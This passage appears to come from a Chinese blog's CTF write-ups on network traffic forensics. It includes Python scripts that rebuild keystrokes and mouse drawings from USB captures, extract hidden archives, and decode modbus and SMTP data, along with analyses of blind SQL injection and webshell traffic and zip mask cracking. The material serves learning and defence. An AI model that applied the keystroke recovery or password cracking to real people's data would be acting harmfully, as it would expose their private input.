<span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a[i]), <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> j+<span class="number">2</span> != <span class="built_in">len</span>(a[i]):</span><br><span class="line">                    out += a[i][j] + a[i][j+<span class="number">1</span>] + <span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out += a[i][j] + a[i][j+<span class="number">1</span>]</span><br><span class="line">            f1.write(out)</span><br><span class="line">            f1.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
-
-<p>将文中的数据还原成键位</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#最后用脚本提取  键盘数据 -&gt; 字符</span></span><br><span class="line">   <span class="comment"># print((line[6:8])) #输出6到8之间的值</span></span><br><span class="line">   <span class="comment">#取出6到8之间的值</span></span><br><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\键盘\\out.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)) </span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-01.png"></p>
-<blockquote>
-<p>flag{7200[DEL]53[DEL]93}</p>
-</blockquote>
-<h2 id="USB流量-鼠标数量"><a href="#USB流量-鼠标数量" class="headerlink" title="USB流量 - 鼠标数量"></a>USB流量 - 鼠标数量</h2><p>先用tshark获取</p>
-<p><code>tshark -r usb2.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p>
-<p>将数据通过：分隔开</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将上面的文件用脚本分隔，加上冒号；</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\桌面\\CTF\\Misc流量\\鼠标\\usbdata.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\桌面\\CTF\\Misc流量\\鼠标\\out.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  a=f.readline().strip()</span><br><span class="line">  <span class="keyword">if</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:<span class="comment">#键盘流量的话len为16鼠标为8 </span></span><br><span class="line">      out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>] </span><br><span class="line">      f1.write(out) </span><br><span class="line">      f1.write(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">    <span class="keyword">break</span> </span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure></div>
-
-<p>通过脚本转换成图片</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">2000</span>,<span class="number">2000</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))<span class="comment">#创建Image对象</span></span><br><span class="line">f =<span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\CTF\Misc流量\鼠标\out1.txt&quot;</span>)<span class="comment">#xy.txt文件 </span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point =line.split()</span><br><span class="line">    img.putpixel((<span class="built_in">int</span>(point[<span class="number">0</span>]),<span class="built_in">int</span>(point[<span class="number">1</span>])),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))<span class="comment">#读取文件中的每一行，并修改像素 </span></span><br><span class="line">f.close() </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-02.png"></p>
-<p>还可以通过gnuplot软件来生成图形，（windows和linux均可，都可以下载）</p>
-<p>我是在windows下安装的，是个 exe软件，打开之后 </p>
-<p>plot ‘filepath’</p>
-<p>我是直接放在当前目录了 </p>
-<p>生成之后用画图软件翻转一下即可</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-03.png"></p>
-<hr>
-<h2 id="Buu-TLS流量分析"><a href="#Buu-TLS流量分析" class="headerlink" title="Buu - TLS流量分析"></a>Buu - TLS流量分析</h2><p><a class="link" href="https://zhuanlan.zhihu.com/p/32059190">了解学习OSI模型TCP&#x2F;IP模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>      <a class="link" href="https://www.jianshu.com/p/c793a279f698">了解学习OSI模型TCP&#x2F;IP模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a href="SSL/TLS%E4%BC%9A%E8%AF%9D%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">学习 SSL&#x2F;TLS会话流量分析</a></p>
-<p>过滤http流量</p>
-<p>发现有个数据包中有个log文件</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-00.png"></p>
-<p>保存到本地为1.log，然后导入TLS的秘钥中</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-01.png"></p>
-<p>再过滤http流量，发现多了一些流量，然后其中有一个保存有flag</p>
-<h2 id="Buu-神比流量"><a href="#Buu-神比流量" class="headerlink" title="Buu - 神比流量"></a>Buu - 神比流量</h2><p>用Wireshark打开发现是USB数据；其中有一个数据包隐藏了7z文件</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-03.png"></p>
-<p>选中 as a Hex Stream &#x3D;&gt; 在记事本中粘贴看看有没有问题</p>
-<p>从37 7a开始选中，用脚本写入到.7z文件中</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata = <span class="string">&#x27;377abcaf271c00044aaed88750000000000000006a000000000000002d108d3939dc5abb57f2606b99b18fb7518aa378d2dcfed3f7a197d4e752b6156b026bf975d5fa5c37618bdfe2c567592e7128e139c1a6ac4e9eed598dd3398c03c16a35502e827004852aae6a7342214fa901c30104060001095000070b0100022406f107010a5307ef3e981518c6bd122121010001000c4a4600080a011a4cdb8a00000501190900000000000000000011130066006c00610067002e0074007800740000001900140a010066629f3bc46cd801150601002000000000000600313233343536&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\flag.7z&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(unhexlify(hexdata))</span><br></pre></td></tr></table></figure></div>
-
-<p>得到7z文件，发现其中的文件需要解密，用010打开7z文件，文末藏有密码123456</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-02.png"></p>
-<p>打开flag.txt文件，是一个谷歌云盘的下载地址，下载下来之后，依然是一个压缩包（main.exe文件 和 out.txt文件），密码尝试一下123456成功</p>
-<p>接下来不会了。看官方Wp（需要逆向分析exe文件 是进行了Xor运算）</p>
-<p><a class="link" href="https://cloud.tencent.com/developer/article/2088394">官方Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="NSSCTF-NISACTF-2022-流量包里有个熊"><a href="#NSSCTF-NISACTF-2022-流量包里有个熊" class="headerlink" title="NSSCTF - [NISACTF 2022]流量包里有个熊"></a>NSSCTF - [NISACTF 2022]流量包里有个熊</h2><p>用wireshark打开，发现有个jpg图片</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-02.png"></p>
-<p>将值弄出来放在文本中，用脚本写到图片中 [ 我不会直接将其复制在010中 ]</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这里的hexdata太长了，就不粘贴了</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\\OneDrive\\桌面\\test.jpg&#x27;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(unhexlify(hexdata)) <span class="comment"># unhexlify将十六进制数据转换为二进制数据</span></span><br></pre></td></tr></table></figure></div>
-
-<p>然后对图片binwalk分离一下</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-03.png"></p>
-<p>一个压缩包，一个flag.txt，一个图片</p>
-<p>肯定先看flag，是base64加密，解密一下发现是假的</p>
-<p>然后打开压缩包</p>
-<p>最后发现了最后一个flag.txt文件，但是里面的数据看不懂，</p>
-<p>看Wp说是加密，移位的加密 rot位移密码（rot5 rot13 rot18 rot47）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-04.png"></p>
-<p><a class="link" href="https://lzltool.cn/Tools/Rot13">先将txt文本中的内容进行rot13解密 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-05.png"></p>
-<p>然后就是使用刚开始的脚本将这段数据写在jpg中 [ 开头是ff d8 ff ]</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;filepath&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(unhexlify(hexdata))</span><br></pre></td></tr></table></figure></div>
-
-<p>得到的图片是有盲水印的</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-06.png"></p>
-<p>看不清.</p>
-<h2 id="NSSCTF-CISCN-2023-初赛-被加密的生产流量"><a href="#NSSCTF-CISCN-2023-初赛-被加密的生产流量" class="headerlink" title="NSSCTF - [CISCN 2023 初赛]被加密的生产流量"></a>NSSCTF - [CISCN 2023 初赛]被加密的生产流量</h2><p>用wireshark打开之后，发现有很多的modbus流量，且文件名就是modbus，很显然，追踪一下这个，看到了一些两个为一组的字符，题目中也提醒了是被加密的。想到了base加密</p>
-<p>这个题的加密部分不多，手动复制粘贴即可，下面这个脚本（看Wp看到的）算是一个模板，如果以后碰到了特别多的，无法手动的，分析一下加密字符所在位置，用脚本提取</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line">cap = pyshark.FileCapture(input_file=<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\modbus.pcap&quot;</span>,tshark_path=<span class="string">&#x27;F:\\ctf\wireshark\\tshark&#x27;</span>,display_filter=<span class="string">&#x27;modbus  &amp;&amp; frame.len == 66&#x27;</span>)</span><br><span class="line"><span class="comment"># input_file 是流量的文件路径，tshark_path是tshark软件在的位置，一般是在WireShark命令下</span></span><br><span class="line"><span class="comment"># 后面的 display_filter 把它看做是wireshark中的过滤器。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2str</span>(<span class="params"><span class="built_in">id</span>:<span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">id</span>)).replace(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> cap:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(p.modbus.word_cnt) == <span class="number">5</span>: <span class="comment"># 我起初也没懂这个 word_cnt 打开流量包，发现是一个参数，为什么要等于5？ 因为加密的字符显示出来的十六进制数据是5位</span></span><br><span class="line">            tmp = p.modbus.word_cnt</span><br><span class="line">            tmp = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(p.modbus.word_cnt))).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            flag = flag + tmp</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">flag = hex2str(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-01.png"></p>
-<h2 id="NSSCTF-HGAME-2022-week1-好康的流量"><a href="#NSSCTF-HGAME-2022-week1-好康的流量" class="headerlink" title="NSSCTF - [HGAME 2022 week1]好康的流量"></a>NSSCTF - [HGAME 2022 week1]好康的流量</h2><p>wireshark打开，发现是SMTP和TCP协议，百度了一下啊</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-00.png"></p>
-<blockquote>
-<p>说明是发送了邮件</p>
-</blockquote>
-<p>就随便找，追踪TCP流时发现有base64加密的特征。</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-01.png"></p>
-<blockquote>
-<p>为什么会发现是base64加密？</p>
-</blockquote>
-<p>-&gt; 自己做的时候就直觉，写payload复现的时候发现有告诉是base64加密（追踪TCP流的页面）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-02.png"></p>
-<p>告诉我们了这是png图片， &#x3D;&gt; base64解码成图片</p>
-<p><a class="link" href="https://www.toolnb.com/tools/base64ToImages.html">在线解码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>接下来就是对图片的分析，我是先用虚拟机进行了foremost和binwalk 无果</p>
-<p>然后就是用了StegSolve，但是我没发现什么（就几个选项过了一遍，没发现）</p>
-<p>-&gt; 然后去看Wp了，一个是 Green通道2有条码</p>
-<p>-&gt;LSB其实在base64解码的时候算是提醒了（但是我不会调参数）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-03.png"></p>
-<p><a class="link" href="https://tuzim.net/decode/">解条码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-04.png"></p>
-<p>两半flag拼接 <code>hgame&#123;ez_1mg_Steg4n0graphy&#125;</code></p>
-<h2 id="攻防世界-流量分析1"><a href="#攻防世界-流量分析1" class="headerlink" title="攻防世界 - 流量分析1"></a>攻防世界 - 流量分析1</h2><p>下载<a class="link" href="https://adworld.xctf.org.cn/media/file/task/52ca22d3-4482-47ec-b6ae-7b702d1594e9.zip">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，用wireshark打开，发现是关于gopher协议配合上的sql注入（gopher应该是ssrf，我光知道这个打redis什么的，没见过利用它写sql注入的），sql语句经过了两次url编码，解码之后发现是 时间盲注（sleep）</p>
-<p>用tshark提取sql语句</p>
-<p><code>tshark -r challenge.pcapng -T fields -Y &quot;http.request.method==GET&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt</code></p>
-<p>-&gt; 前面两三个跟这个有关的，改一下就能直接提取</p>
-<p>-&gt; 写多了，发现了 如果想要自己独立提取信息，逐级的 跟上面的<code> -e &quot;http.request.uri.query.parameter&quot;</code>我自己没独立试过，但是发现这是有技巧的，也算是记住了</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-7-00.png"></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># data.txt的信息是经过二次url编码的，通过这个脚本提取解码后的信息</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\out.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">lines = f1.readlines()</span><br><span class="line"><span class="built_in">print</span>(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines)):</span><br><span class="line">    <span class="built_in">print</span>(lines[i])</span><br><span class="line">    <span class="built_in">str</span> = unquote(unquote(lines[i],<span class="string">&#x27;utf-8&#x27;</span>), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>out.txt</p>
-<p>能力有限，我无法直接光提取sql语句了，但是我想到通过 搜索功能、</p>
-</blockquote>
-<p>(select flag from flag),15,1)，第一条的结果上方就是(select flag from flag),14,1)的最后一位，即第14位的Ascii码值了</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-7-01.png"></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">result = <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">49</span>, <span class="number">113</span>, <span class="number">119</span>, <span class="number">121</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">125</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(result[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="攻防世界-流量分析2"><a href="#攻防世界-流量分析2" class="headerlink" title="攻防世界 - 流量分析2"></a>攻防世界 - 流量分析2</h2><p>导出Http对象，发现每个包中都有几个字符，观察发现拼接起来就是flag</p>
-<p>我做的时候没看到ag只有fl，手动加上ag 提交成功</p>
-<h2 id="23年蓝桥杯的一个题"><a href="#23年蓝桥杯的一个题" class="headerlink" title="23年蓝桥杯的一个题"></a>23年蓝桥杯的一个题</h2><p>用WireShark打开文件，看到了flag.zip &#x3D;&gt;zip的标志PK</p>
-<p>那么过滤一下 <code>http contains &quot;PK&quot;</code>  直接包含flag也可以</p>
-<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-00.png"></p>
-<p>&#x3D;&gt; 用kali中的 foremost分离出来 <code>foremost -T filename</code></p>
-<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-01.png" alt="4-8-01"></p>
-<p>打开flag.zip文件，发现有个flag.txt，但是有密码，有注释<code>密码的正则：ChunQiu\d&#123;4&#125;</code></p>
-<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-02.png"></p>
-<p>\d &#x3D;&gt; 正则匹配，表示一个数字 {4} 匹配四次</p>
-<p>&#x3D;&gt; ChunQiu???? 四个数字</p>
-<p>&#x3D;&gt; 想到掩码破解</p>
-<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-03.png"></p>
-<p>打开flag.txt 得到flag</p>
-<h2 id="2021陇剑杯-webshell-—-Webshell流量分析"><a href="#2021陇剑杯-webshell-—-Webshell流量分析" class="headerlink" title="2021陇剑杯 - webshell — Webshell流量分析"></a>2021陇剑杯 - webshell — Webshell流量分析</h2><p><a class="link" href="https://pan.baidu.com/s/1X4Ujko8SQshNpnqyZq4C0w?pwd=1234">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><code>第一问：找到黑客登录系统使用的密码</code></p>
-<p>-&gt; 用wireshark打开，随便找一找，因为是密码 第一想法是post方法（隐蔽安全）</p>
-<p>-&gt; 在<code>http.request.method == &quot;POST&quot; &amp;&amp; http contains &quot;login&quot;</code>可以找到</p>
-<p><code>第二问：黑客修改了一个日志文件，日志文件的绝对路径</code></p>
-<p>-&gt; 日志文件的内容，是通过TCP流传输的。我们要追踪TCP流</p>
-<p>-&gt; 第一下肯定先直接过滤tcp流，直接对第一个流量包追踪tcp流 能看到明显特征</p>
-<p>**-&gt; 我第一时间没想到tcp流 [ 看Wp说到的，且要与之前的1.php相联系 ]  **</p>
-<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-16-00.png"></p>
-<p><code>第三问：黑客获取webshell后，权限是？</code></p>
-<p>-&gt; 想到之前看到了有whami，<code>tcp contains &quot;whami&quot;</code> 无果</p>
-<p>-&gt; 最后在流量包中看到了www-data 但我不知道这是一种权限的名称（我只知道root和普通用户）</p>
-<p>-&gt; 结果就是 www-data</p>
-<p><code>第四问：webshell文件名</code></p>
-<p>-&gt; 我们之前看到有<code>ini_set</code> &#x3D;&gt; 1.php</p>
-<p>-&gt; ini_set 是蚁剑webshell的流量特征</p>
-<p><code>第五问：黑客上传的代理工具客户端名字</code></p>
-<p>-&gt; </p>
-<p><code>第六问：黑客代理工具的回连服务端IP是</code></p>
-<p><code>第七问：黑客的socks5的连接账号、密码是</code></p>
-<hr>
-<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" href="https://blog.csdn.net/m0_51198141/article/details/132643738">Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link" href="https://www.cnblogs.com/B0like/p/17486657.html">webshell流量特征01 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link" href="https://www.clementi.top/2023/06/21/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">webshell流量特征02 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<blockquote>
-<p>编码器：对发送的流量进行编码，服务端再对流量进行解码</p>
